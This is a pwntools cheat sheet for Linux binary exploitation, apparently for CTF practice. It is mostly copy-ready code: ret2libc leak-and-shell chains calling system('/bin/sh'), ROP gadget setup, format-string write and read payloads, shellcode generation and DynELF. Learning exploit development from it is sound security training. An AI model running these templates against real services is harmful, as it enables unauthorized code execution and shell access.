# pwntools Cheat Sheet (deeper dive)

## Practical exploit-dev patterns (Linux)

---

## 🚀 Setup: context, ELF, args, logging

This sets global defaults pwntools uses everywhere (packing size, asm/disasm, ROP assumptions, logging). The `terminal` line is just for `gdb.attach()` so it pops in a tmux split instead of a new window.

```python
from pwn import *

context.update(
    arch="amd64", os="linux",
    terminal=["tmux", "splitw", "-h"],
    log_level="info",
)

elf = context.binary = ELF("./chall", checksec=False)
```

### Common CLI flags in pwntools scripts
pwntools treats bare words as boolean flags (e.g. `GDB`, `REMOTE`). `HOST=...` and `PORT=...` become string args you can read via `args.HOST`, etc.

```bash
python3 solve.py
python3 solve.py GDB
python3 solve.py REMOTE HOST=example.com PORT=31337
python3 solve.py LOG=debug
```

```python
if args.LOG:
    context.log_level = args.LOG
```

---

## 🧱 Starting a target: local / remote / ssh

### A robust `start()` helper
This gives you one entrypoint for all environments:
- Local: `process()`
- Remote TCP: `remote(host, port)`
- Remote shell: `ssh(...).process(...)`

```python
from pwn import *

elf = context.binary = ELF("./chall", checksec=False)

def start(argv=None, *a, **kw):
    argv = argv or []
    if args.REMOTE:
        host = args.HOST or "127.0.0.1"
        port = int(args.PORT or 31337)
        return remote(host, port)
    if args.SSH:
        s = ssh(host=args.HOST, user=args.USER, password=args.PASS)
        return s.process([elf.path] + argv, *a, **kw)
    return process([elf.path] + argv, *a, **kw)
```

### Timeouts and desync protection
When the target prints menus/prompts, you want to **wait for a delimiter** before sending, otherwise you’ll desync (especially over remote). Add small timeouts so failures are obvious instead of hanging forever.

```python
p = start()
p.recvuntil(b"> ", timeout=2)
p.sendline(b"1")
```

---

## 🧰 Bytes / packing / alignment

### Prefer pwntools packers (`p64`, `p32`) and `flat()`
`flat()` builds a payload without you manually concatenating bytes. Integers get packed according to the `word_size`/endianness you specify (or `context.bits`). This avoids the classic “why is my address backwards?” bug.

```python
from pwn import *

payload = flat(
    b"A" * 40,
    0x401016,                 # ret
    0x4011aa,                 # pop rdi; ret
    0x404018,                 # puts@got
    0x401030,                 # puts@plt
    0x401050,                 # main
    word_size=64, endianness="little"
)
```

### Quick “pack by arch” helper
Useful when you’re solving both 32-bit and 64-bit binaries and want one function that follows `context.bits`.

```python
from pwn import *

def pack(x: int) -> bytes:
    return p64(x) if context.bits == 64 else p32(x)
```

---

## 🧠 ELF / libc basics

`ELF()` parses symbols, PLT/GOT, sections, and headers from binaries (and libc if you have it). It’s your “what addresses exist?” source of truth.

```python
elf  = ELF("./chall", checksec=False)
libc = ELF("./libc.so.6", checksec=False)   # if provided

log.info("PIE=%s NX=%s RELRO=%s", elf.pie, elf.nx, elf.relro)
```

### PLT/GOT/symbol lookups
- `elf.plt[...]`: where your ROP calls jump to (stubs in the main binary)
- `elf.got[...]`: where resolved libc addresses live at runtime (good leak targets)
- `elf.symbols[...]`: functions/objects defined in the ELF’s symbol tables

```python
puts_plt = elf.plt["puts"]
puts_got = elf.got["puts"]
main     = elf.symbols["main"]
```

---

## 🔗 ROP: gadgets, chains, and common pitfalls

### Build ROP from the binary
`ROP(elf)` searches the binary for gadgets. On amd64, you often need:
- `pop rdi; ret` to set the first function argument
- a plain `ret` to fix **stack alignment** (some libc code uses `movaps` and crashes on misalignment)

```python
from pwn import *
elf = context.binary = ELF("./chall", checksec=False)

rop = ROP(elf)
pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
ret = rop.find_gadget(["ret"])[0]  # alignment on some systems
```

### Call a function with arguments (amd64 System V)
System V AMD64 passes args in registers: `rdi, rsi, rdx, rcx, r8, r9`. This chain only sets `rdi` before calling `puts@plt`.

```python
chain = flat(
    ret,
    pop_rdi, 0xdeadbeef,
    elf.plt["puts"],
)
```

---

## 🧪 GDB integration

### Attach only when asked
This keeps your script usable in “fast runs” but lets you drop into debugging when you need it. The `gdbscript` is just a mini `.gdbinit` you embed per run.

```python
from pwn import *

gdbscript = """
set pagination off
set disassembly-flavor intel
break *main
continue
"""

p = start()
if args.GDB:
    gdb.attach(p, gdbscript=gdbscript)
```

### Debug child processes (fork/exec)
Some challenges `fork()` then do the real work in the child. These settings tell GDB to follow the child and keep both processes under control.

```gdb
set follow-fork-mode child
set detach-on-fork off
```

---

## 🧨 Format strings (beyond “hello %x”)

### Find the stack offset (interactive technique)
Goal: figure out which positional argument index corresponds to your controlled bytes on the stack.
- Put a marker (`AAAABBBB`) then spray `%p` to dump pointers.
- When you see `0x4242424241414141` (little-endian of `AAAABBBB`) you’ve found the offset.

```python
from pwn import *

p = start()
p.sendline(b"AAAABBBB.%p.%p.%p.%p.%p.%p.%p.%p")
leak = p.recvline()
print(leak)
```

### Automated writes with `fmtstr_payload`
Once you know `offset`, pwntools can generate the full `%n` payload for you.
- `writes={addr: value}` expresses the write-what-where.
- `write_size="short"` is common to reduce payload size and avoid huge padding.

```python
from pwn import *

offset = 6  # example; you must determine per target
writes = {
    0x404050: 0xdeadbeef,       # write-what-where
    0x404058: 0x1337,
}

payload = fmtstr_payload(offset, writes, write_size="short")
```

### Read memory with `%s` (dangerous but common)
This is a common “read primitive”: you place an address you control onto the stack, then use `%<k>$s` to treat it as a `char*` and print bytes until NUL.
- It can crash if the address is unmapped.
- It truncates at `\x00`.

```python
from pwn import *

addr = 0x404000
offset = 6
payload = flat(p64(addr), f"%{offset}$s".encode())
```

---

## 🧯 Ret2libc (classic, reusable pattern)

This pattern assumes:
- You can overflow up to RIP/EIP
- You can call `puts(puts@got)` to leak libc
- You can return back to `main` (or a safe loop) for stage 2

### Stage 1: leak libc address
This stage forces the program to print the runtime address of `puts` by calling:
`puts(puts@got)`.
Because the GOT entry contains the resolved libc address, the printed value is a libc leak.

```python
from pwn import *

elf = context.binary = ELF("./chall", checksec=False)
libc = ELF("./libc.so.6", checksec=False)

offset = 40  # overwrite offset

rop = ROP(elf)
pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
ret = rop.find_gadget(["ret"])[0]

def leak_puts(p):
    payload = flat(
        b"A" * offset,
        ret,
        pop_rdi, elf.got["puts"],
        elf.plt["puts"],
        elf.symbols["main"],
    )
    p.sendline(payload)
    leak = u64(p.recvline().strip().ljust(8, b"\x00"))
    return leak
```

### Stage 2: call `system("/bin/sh")`
Once you know `libc.address`, every libc symbol becomes “base + offset”.
- `libc.symbols["system"]` gives the offset of `system`.
- `next(libc.search(b"/bin/sh\x00"))` finds the `/bin/sh` string inside libc.

```python
from pwn import *

def pwn(p, puts_leak):
    libc.address = puts_leak - libc.symbols["puts"]
    binsh = next(libc.search(b"/bin/sh\x00"))

    rop = ROP(libc)
    payload = flat(
        b"A" * offset,
        ret,
        pop_rdi, binsh,
        libc.symbols["system"],
    )
    p.sendline(payload)
    p.interactive()
```

---

## 🕵️ DynELF (when you don’t have libc)

DynELF is a “leak oracle” approach: you implement a function that can leak arbitrary memory, and pwntools resolves symbols for you.

```python
from pwn import *

def leak(addr: int) -> bytes:
    # Implement for your target: return N bytes read from `addr`.
    # Common approaches: format string read, stack read primitive, arbitrary read gadget, etc.
    raise NotImplementedError

# d = DynELF(leak, elf=ELF("./chall"))
# system = d.lookup("system", "libc")
```

---

## 🧬 Shellcraft (generate shellcode quickly)
Use this when NX is off, you have an RWX region, or you’re doing a staged loader. `asm()` assembles, `disasm()` is a sanity check.

```python
from pwn import *

context.update(arch="amd64", os="linux")
sc = asm(shellcraft.sh())
print(disasm(sc))
```

---

## 🧩 Common helper functions (copy/paste)

### Safe line receive + parse hex leak
Targets often print leaks like `puts: 0x7ffff7...`. This helper waits for a prefix, then parses the following line as hex.

```python
from pwn import *

def recv_hex(p, prefix: bytes, *, timeout=2) -> int:
    p.recvuntil(prefix, timeout=timeout)
    s = p.recvline(timeout=timeout).strip()
    return int(s, 16)
```

### Leak `u64` from a line (common `puts`-style)
Many “leak via puts” cases return fewer than 8 bytes before newline/NUL. Padding with `\x00` lets `u64()` decode it safely.

```python
from pwn import *

def recv_u64_line(p, *, timeout=2) -> int:
    s = p.recvline(timeout=timeout).strip()
    return u64(s.ljust(8, b"\x00"))
```

---

## ✅ Mental checklist (before you overcomplicate)
- **Crash triage**: offset correct? cyclic? stack alignment?
- **Mitigations**: PIE/NX/RELRO/Canary? `checksec`/GEF `checksec`
- **I/O sync**: use `sendlineafter`/`recvuntil`
- **Byte order**: always validate with `.hex()`
- **Remote drift**: different libc, different ASLR, different line endings

---

**Version**: 1.0 | **Last Updated**: April 2026  
**For**: pwntools-based exploit scripts

